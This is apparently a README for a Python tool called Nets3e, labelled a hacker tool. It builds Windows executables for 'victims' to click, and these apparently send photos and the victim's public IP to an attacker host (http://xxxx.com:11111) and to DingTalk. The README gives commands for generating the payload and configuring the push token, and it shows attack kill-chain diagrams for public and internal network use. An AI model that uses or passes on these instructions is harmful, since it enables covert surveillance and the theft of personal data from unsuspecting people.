  <div align="center">
<p align="center">
 <img title="Nets3e" src='https://img.shields.io/badge/Nets3e-1.1.3-brightgreen.svg' />
 <img title="Nets3e" src='https://img.shields.io/badge/Python-3.9-yellow.svg' />
  <img title="Nets3e" src='https://img.shields.io/badge/HackerTool-x' />
 <img title="Nets3e" src='https://img.shields.io/static/v1?label=Author&message=@Martin&color=red'/>
 <img title="Nets3e" src='https://img.shields.io/badge/-windows-F16061?logo=windows&logoColor=000'/>
 </p>
  <img height="137px" src="https://github-readme-stats.vercel.app/api?username=MartinXMax&hide_title=true&hide_border=true&show_icons=trueline_height=21&text_color=000&icon_color=000&bg_color=0,ea6161,ffc64d,fffc4d,52fa5a&theme=graywhite" />
  
   
 <table>
  <tr>
      <th>Function</th>
  </tr>
  <tr>
    <th>Fixed the issue where the victim was unable to access the public IP address[NEW]</th>
    <th>Share data with DingTalk [NEW]</th>

</tr>
 
 </table>
</div>


  
## Nets3e Example

``pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pycryptodome,Pillow``

``#python3 Nets3e.py -h``

![图片名称](./PT/help.png) 



```ps:Use '- g' to generate PAYLOAD, but you don't need to specify '- g'```

``#python3 Nets3e.py -rh http://xxxx.com:11111 -g``


![图片名称](./PT/1.png) 

``Follow the prompts in/ Generate two exe executable files from the dist directory``

![图片名称](./PT/2.png) 

_Nets3eClient_debug.exe -> The debug version of internal network attacks is mainly used to test whether internal network victims can reach the local machine_

_Nets3eClient_release.exe -> The release version of public network attacks is mainly used to attack public network users_

## Public network attack

``Victims click on Nets3eClient_release.exe``




![图片名称](./PT/out.png) 

``Attack Kill Chain``

![图片名称](./PT/Chain_Re.png) 

## Internal network attack

``Victims click on Nets3eClient_debug.exe``

``PS:Affected hosts on the internal network will first obtain their own public IP address and then send photos to the internal network host. In fact, the traffic is not forwarded by the server``



![图片名称](./PT/in.png) 

``Attack Kill Chain``

![图片名称](./PT/Chain_Debug.png) 


# Configure the API for victims to obtain public IP addresses, and configure nail push TOKEN and keys

![图片名称](./PT/config.png) 


## Push using (- dd) after configuration

``#python3 Nets3e.py -dd ``

![图片名称](./PT/dd1.png) 

```Victims click on the app```


![图片名称](./PT/getip.png) 

![图片名称](./PT/ip.png) 